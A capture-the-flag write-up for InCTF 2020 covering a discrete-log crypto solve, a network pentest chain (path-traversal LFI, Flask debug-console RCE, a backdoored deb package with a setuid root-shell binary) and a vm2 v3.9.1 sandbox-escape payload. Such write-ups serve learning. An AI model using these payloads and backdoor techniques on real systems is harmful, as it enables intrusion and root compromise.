---
slug: inctf-2020-write-up
title: InCTF 2020 Write Up
description: InCTF 2020 Crypto、Web 與 Network Pentest 題目的分析與解題紀錄。
pubDate: "2020-08-04"
authors:
  - oalieno
category: Write-up
tags:
  - InCTF 2020
  - crypto
  - web
  - network pentest
featured: false
coverTone: night
language: en
legacy: true
legacySource: https://github.com/bamboofox/bamboofox-blog-old/blob/inctf2020/_posts/2020-08-03-inctf-2020-write-up.md
legacyPath: "/write-ups/2020/08/04/inctf-2020-write-up.html"
---

## Crypto

### DLPoly

#### tl;dr

discrete logarithm baby step giant step

#### writeups

```python
P.<x> = PolynomialRing(Zmod(p))
Q.<x> = QuotientRing(P, P.ideal(n))
g = x
print(bsgs(g, gX, (0, 2 ^ 56), operation='*'))
```

Use sagemath `bsgs` ( baby step giant step ) to brute force discrete logarithm. But may run out of memory. I split it into 1024 sections and run each section paralleling using 8 core. See `a.sh` and `b.sh` and `solve.sage` for details. And then found that the length of flag is only 13 !?? The description also say something about RSA? And I found that `n` has many small factor. But I got the flag before I reimplementing pohlig hellman algorithm.

#### flag

`inctf{bingo!}`

## Network Pentest

### Secure Extractor

#### tl;dr

LFI + flask debug mode RCE -> get root privilege through crontab fetch backdoored deb package

#### writeups

First, we need to use OpenVPN to connect to the private network.

http://172.30.0.4:5000, we can upload a zip file to this website and view the unzip files.  
`curl --path-as-is http://172.30.0.4:5000/../app.py` to get the source code.  
The server is written in flask and debug mode is on.  
Follow [Flask debug pin 安全問題](https://www.kingkk.com/2018/08/Flask-debug-pin%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/) to get the debug pin code `262-855-700`.  
Then go to http://172.30.0.4:5000/console execute arbitrary python code.  
Write my ssh key to `.ssh/authorized_keys` and then ssh to the server.  
Found a crontab job fetching http://172.30.0.6/uploads/packages and install packages using dpkg.  
Since no one is using that ip, `ip addr add 172.30.0.6 dev tap0`.  
Then create a backdoored deb package following [create a backdoor deb package](https://blog.csdn.net/nixawk/article/details/38850993).  
The deb packge will install the following binary into `/usr/bin/`.

```c
#include <stdlib.h>

int main () {
    setuid(0);
    system("/bin/bash");
}
```

Remember to `chmod u+s binary` set the suid bit.  
Then the binary will be installed into the server and we can get the root privilege.  
`cat /root/flag.txt` to get the flag.

## Web

### Landscape

#### tl;dr

escape [vm2](https://www.npmjs.com/package/vm2) v3.9.1.

#### writeups

There is a comment in website says `<!--If u absolutely can't resist hacking then go \-_-/ run ? code . but i doubt if u can find what u r searching for -->`.  
After a few guess, `http://34.73.121.250/run?code=throw 1+1` we found that we can run node js code.  
`http://34.73.121.250/run?code=throw Object.keys(this.process.env)` viewing the envrionment and see that we are stuck in [vm2](https://www.npmjs.com/package/vm2) v3.9.1.  
Browsing the [CHANGELOG.md](https://github.com/patriksimek/vm2/blob/master/CHANGELOG.md) and found `[fix] Fixed breakouts in NodeVM (XmiliaH)`.  
https://github.com/patriksimek/vm2/issues/276 this is the 1day exploit payload.  
`http://34.73.121.250/run?code=(function() { throw setTimeout(()=>{}).ref().constructor.constructor('return process')().mainModule.require('fs').readdirSync('/home/s3cr3t/landscape/'); })()` Browse the directory.  
`http://34.73.121.250/run?code=(function() { throw setTimeout(()=>{}).ref().constructor.constructor('return process')().mainModule.require('fs').readFileSync('/home/s3cr3t/landscape/flag.txt'); })()` Get the flag.

#### flag

`inctf{Pretty_Good,_that_u_reached_till_here8}`
